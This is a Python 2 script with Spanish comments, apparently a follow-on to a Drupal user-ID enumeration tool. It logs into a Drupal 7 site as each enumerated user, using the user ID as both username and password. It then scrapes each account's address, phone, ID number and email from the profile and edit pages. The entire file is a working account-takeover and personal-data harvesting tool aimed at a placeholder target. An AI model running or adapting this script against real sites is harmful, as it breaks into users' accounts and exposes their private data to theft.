#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: @kr1shn4murt1
# Fecha: Noviembre 26 - 2013 
# Para usar luego de haber usado el script enumeracion_ID_Usuarios_Drupal.py
# Este script se loguea como cada usuario usando el identificador obtenido
# como usuario y contrasenha y lleva acabo acciones a nombre del usuario
# como dar click, se pueden extraer sus datos como direccion, correo, etc

# Se importa libreria que emula un navegador web
import mechanize
# Se importa libreria para parsear el html y saber donde dara click y demas
# acciones el objeto de la libreria mechanize
import BeautifulSoup

#Para controlar cuanto demora la ejecuci贸n del script
import time 

horaInicio= time.time()
print 'Hora de inicio del script: ',time.ctime(horaInicio), '\n'

# Algunos de los comentarios son porciones de codigo usadas durante 
# la afinacion del script, no necesarias en la version final
"""
for form in navegador.forms():
	print form
"""
# Se obtiene el listado de identificadores de usuarios de un archivo de texto
usuarios_Encontrados= open('usuarios_Encontrados.txt','r')

# Se obtienen todos los identificadores de usuarios encontrados del archivo de texto
for usuario in usuarios_Encontrados:
	
	try:
		navegador= mechanize.Browser()

		navegador.open('http://vulnerable.com/es/user/login')
		usuario= usuario.replace('\n','')

		#usuario= 'A011074081'

		navegador.select_form(nr=1)

		navegador.form['name']= usuario

		navegador.form['pass']= usuario

		navegador.submit()

		# Imprimir respuesta de la pagina web
		"""
		fuente= navegador.response().read()

		webParseada= BeautifulSoup.BeautifulSoup(fuente)
		#print fuente

		print webParseada
		"""
		# Para la web especifica con que se hicieron pruebas que era un 
		# drupal 7 los datos como direccion, telefono, cedula, aparecian en 
		# pantalla al darle click al link "HOla"
		# Se encuentra el link que contiene el texto HOla el cual es el link del perfil donde estan los datos
		
		perfil= ''

		for link in navegador.links(text_regex='Hola'):
			perfil= link.text

		# Se crea el link para navegar a los datos de la cuenta del usuario
		new_link= navegador.click_link(text= perfil)

		# Se emula darle click al link
		navegador.open(new_link)

		fuente= navegador.response().read()

		# Se convierte el fuente de la pagina a un objeto que puede ser
		# parseable lo cual facilita moverse entre tags, links, texto, etc
		webParseada= BeautifulSoup.BeautifulSoup(fuente)
		#print fuente

		#print webParseada

		# Se extrae la porcion que contiene los datos del usuario
		datos= webParseada.findAll('dl')[1].findAll('div')[0].getText()
		datos= datos.replace('&nbsp;',' ')

		# Se imprimen los datos al final
		#print datos

		# Se crea el link para ir donde se visualiza el correo
		new_link= navegador.click_link(text= 'Editar')
		navegador.open(new_link)

		fuente= navegador.response().read()

		webParseada= BeautifulSoup.BeautifulSoup(fuente)

		# Accediendo solo al campo de correo
		#webParseada.findAll("div", { "class" : "form-item form-type-textfield form-item-mail" })

		# Forma mas optima por atributo obtiene toda la linea
		# webParseada.findAll(attrs={"name" : "mail"})

		# Obtiene exactamente el campo del correo
		correo= webParseada.findAll(attrs={"name" : "mail"})[0]['value']

		print datos

		print 'correo: ',correo

		print '*****************************************************************************************************************************************\n'

		# Se cierra sesion para iniciar sesion con los otros usuarios del listado
		# /es/user/logout
		new_link= navegador.click_link(url= '/es/user/logout')
		navegador.open(new_link)

		fuente= navegador.response().read()

		webParseada= BeautifulSoup.BeautifulSoup(fuente)

		#print webParseada

	# Excepcion para el caso en que no sea posible iniciar con el id de usuario
	# O no se tengan datos del usuario en la web
	except:
		print 'No fue posible iniciar sesion con el usuario, o el usuario no tiene datos: ', usuario, '\n'
		continue

horaFin= time.time()
print 'Hora de inicio del script: ',time.ctime(horaInicio)
print 'Hora de finalizaci贸n del script: ',time.ctime(horaFin)

tiempoEjecucion= horaFin-horaInicio
print '\t La ejecuci贸n tom贸 %s segundos'%str(tiempoEjecucion)